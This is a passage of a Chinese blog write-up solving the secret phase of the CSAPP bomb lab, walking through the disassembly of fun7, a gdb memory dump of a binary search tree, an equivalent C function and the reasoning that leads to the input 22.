14行后，调用了<code>fun7</code>函数，其中有两个参数，<code>esi</code>和<code>edi</code>,<code>esi</code>是输入，<code>edi</code>是一个内存地址</li><li>第16行，返回值与2比较，相等则成功，即目标：使<code>fun7</code>返回2.</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401204 &lt;fun7&gt;:<br>  401204:48 83 ec 08          sub    $0x8,%rsp<br>  401208:48 85 ff             test   %rdi,%rdi #rdi是0则跳出<br>  40120b:74 2b                je     401238 &lt;fun7+0x34&gt;<br>  40120d:8b 17                mov    (%rdi),%edx<br>  40120f:39 f2                cmp    %esi,%edx #rdi-&gt;val&lt;=esi<br>  401211:7e 0d                jle    401220 &lt;fun7+0x1c&gt;<br>  401213:48 8b 7f 08          mov    0x8(%rdi),%rdi<br>  401217:e8 e8 ff ff ff       call   401204 &lt;fun7&gt;<br>  40121c:01 c0                add    %eax,%eax<br>  40121e:eb 1d                jmp    40123d &lt;fun7+0x39&gt;<br>  401220:b8 00 00 00 00       mov    $0x0,%eax<br>  401225:39 f2                cmp    %esi,%edx<br>  401227:74 14                je     40123d &lt;fun7+0x39&gt;<br>  401229:48 8b 7f 10          mov    0x10(%rdi),%rdi<br>  40122d:e8 d2 ff ff ff       call   401204 &lt;fun7&gt;<br>  401232:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax<br>  401236:eb 05                jmp    40123d &lt;fun7+0x39&gt;<br>  401238:b8 ff ff ff ff       mov    $0xffffffff,%eax<br>  40123d:48 83 c4 08          add    $0x8,%rsp<br>  401241:c3                   ret    <br></code></pre></td></tr></table></figure><p>查看0x6030f0处的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/500x 0x06030f0<br>0x6030f0 &lt;n1&gt;:  0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603130 &lt;n22&gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603138 &lt;n22+8&gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603140 &lt;n22+16&gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603150 &lt;n32&gt;: 0x16    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603158 &lt;n32+8&gt;:       0x70    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603160 &lt;n32+16&gt;:      0x30    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603170 &lt;n33&gt;: 0x2d    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603178 &lt;n33+8&gt;:       0xd0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603180 &lt;n33+16&gt;:      0x90    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x603190 &lt;n31&gt;: 0x06    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603198 &lt;n31+8&gt;:       0xf0    0x31    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031a0 &lt;n31+16&gt;:      0x50    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031b0 &lt;n34&gt;: 0x6b    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031b8 &lt;n34+8&gt;:       0x10    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031c0 &lt;n34+16&gt;:      0xb0    0x32    0x60    0x00    0x00    0x00    0x00    0x00<br>0x6031d0 &lt;n45&gt;: 0x28    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031d8 &lt;n45+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031e0 &lt;n45+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031f0 &lt;n41&gt;: 0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6031f8 &lt;n41+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603200 &lt;n41+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603210 &lt;n47&gt;: 0x63    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603218 &lt;n47+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603220 &lt;n47+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603230 &lt;n44&gt;: 0x23    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603238 &lt;n44+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603240 &lt;n44+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603250 &lt;n42&gt;: 0x07    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603258 &lt;n42+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603260 &lt;n42+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603270 &lt;n43&gt;: 0x14    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603278 &lt;n43+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603280 &lt;n43+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603290 &lt;n46&gt;: 0x2f    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x603298 &lt;n46+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032a0 &lt;n46+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032b0 &lt;n48&gt;: 0xe9    0x03    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032b8 &lt;n48+8&gt;:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br>0x6032c0 &lt;n48+16&gt;:      0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00<br></code></pre></td></tr></table></figure><p>不难发现这片内存空间中存着的数据是树结构的定义，其中</p><ul><li>第一行表示其数值</li><li>第二行表示左子树的地址</li><li>第三行表示右子树的地址</li></ul><p>那么其树结构可以用下图表示 注：图中为16进制</p><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/202309062103881.png" alt="image-20230729123350571"></p><p>而fun7函数的c语言版如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fun7</span><span class="hljs-params">(Tree* rdi, <span class="hljs-type">int</span> esi)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!rdi)   <span class="hljs-comment">//第3，4行</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//19</span><br>    <span class="hljs-keyword">if</span> (rdi-&gt;val == esi)    <span class="hljs-comment">//13</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;       <span class="hljs-comment">//20</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rdi-&gt;val &lt; esi)        <span class="hljs-comment">//7</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * fun7(rdi -&gt; right, esi) + <span class="hljs-number">1</span>; <span class="hljs-comment">//15,16</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * fun7(rdi -&gt; left, esi);  <span class="hljs-comment">//8,9</span><br>&#125;<br></code></pre></td></tr></table></figure><p>反推，</p><ul><li>想要得到2，那么一定是从左子树返回1</li><li>想要得到1，那么一定从右子树返回值返回0</li><li>返回值为0，节点值就是输入的值</li></ul><p><code>2=2*fun7(8,16)</code></p><p><code>fun7(8,16)=fun7(16,16)+1=1</code></p><p>那么，隐藏关的答案便呼之欲出，<code>0x16=22</code></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Wow! You&#x27;ve defused the secret stage!<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>耗时3天，总计20h，做完只觉茅塞顿开，csapp这本书相见恨晚。</li><li>各类数据结构在机器级的实现方式令我瞋目结舌。</li><li><code>phase_5</code>的逻辑设计惊艳到了我，其通过输入字符的ascii码来定位字符，结构巧妙令人赞叹不已。</li><li><code>phase_5</code>和<code>secret_phase</code>的用时最长，其复杂的循环或递归结构逻辑复杂，需要先将其转化为c语言。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
      <tag>bomb</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
